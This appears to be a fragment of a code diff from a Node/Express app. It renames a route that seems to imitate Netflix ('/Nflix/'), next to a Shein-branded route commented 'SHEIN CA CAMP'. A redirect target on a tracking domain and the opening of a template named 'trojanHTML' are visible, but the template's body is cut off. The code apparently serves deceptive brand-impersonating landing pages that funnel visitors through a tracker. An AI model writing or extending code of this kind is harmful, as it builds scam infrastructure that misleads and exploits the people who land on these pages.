@@ -40,7 +40,7 @@ app.get('/shein/:slug', (req, res, next) => {
 });
 
 // Middleware to pass on my slug values (SHEIN CA CAMP)
-app.get('/NFflix/:slug', (req, res, next) => {
+app.get('/Nflix/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tmtrcks.com/222898/969`;
     const trojanHTML = `
